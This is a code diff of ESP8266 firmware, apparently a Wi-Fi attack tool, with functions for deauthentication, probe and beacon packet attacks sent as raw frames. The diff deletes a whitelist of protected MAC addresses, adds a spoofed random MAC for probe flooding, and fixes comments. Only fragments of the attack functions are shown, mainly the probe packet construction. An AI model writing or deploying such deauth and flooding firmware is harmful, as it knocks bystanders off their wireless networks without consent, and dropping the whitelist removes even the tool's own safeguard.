@@ -17,16 +17,11 @@
 // Features
 static os_timer_t timer;
 static uint16_t beacon_counter = 0;
-
-// Protected MACs
-uint8_t white_list[2][MAC_ADDR_LEN] =
-{
-    { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
-    { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
-};
+uint8_t probe_random_mac[6] = { 0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22 };
 
 /******************************************************************************
  * Send packet (no socket, through PHY)
+ *
  *******************************************************************************/
 bool ICACHE_FLASH_ATTR
 user_send_packet(uint8_t* packet, uint16_t packet_size, uint8_t channel, uint16_t tries)
@@ -47,6 +42,7 @@ user_send_packet(uint8_t* packet, uint16_t packet_size, uint8_t channel, uint16_
 
 /******************************************************************************
  * Deauth packet attack.
+ *
  *******************************************************************************/
 bool ICACHE_FLASH_ATTR
 user_attack_deauth(uint8_t* ap_mac, uint8_t* client_mac, uint8_t reason, uint8_t channel)
@@ -94,12 +90,13 @@ user_attack_deauth(uint8_t* ap_mac, uint8_t* client_mac, uint8_t reason, uint8_t
 
 /******************************************************************************
  * Probe packet attack.
+ *
  *******************************************************************************/
 bool ICACHE_FLASH_ATTR
 user_attack_probe(const char* ssid, uint8_t channel)
 {
     // Update Random Mac
-    beacon_random_mac[5] = ++beacon_counter;
+    probe_random_mac[5] = ++beacon_counter;
 
     uint16_t packet_size = sizeof(probe_packet);
     uint8_t ssid_len = os_strlen(ssid);
@@ -109,7 +106,7 @@ user_attack_probe(const char* ssid, uint8_t channel)
         ssid_len = 32;
 
     // Build probe packet
-    os_memcpy(&probe_packet[10], beacon_random_mac, 6);
+    os_memcpy(&probe_packet[10], probe_random_mac, 6);
     os_memcpy(&probe_packet[26], ssid, ssid_len);
 
     // Send
@@ -120,7 +117,8 @@ user_attack_probe(const char* ssid, uint8_t channel)
 }
 
 /******************************************************************************
- * Beaco packet attack.
+ * Beacon packet attack.
+ *
  *******************************************************************************/
 bool ICACHE_FLASH_ATTR
 user_attack_beacon(uint8_t* mac, const char* ssid, uint8_t channel, bool wpa2)
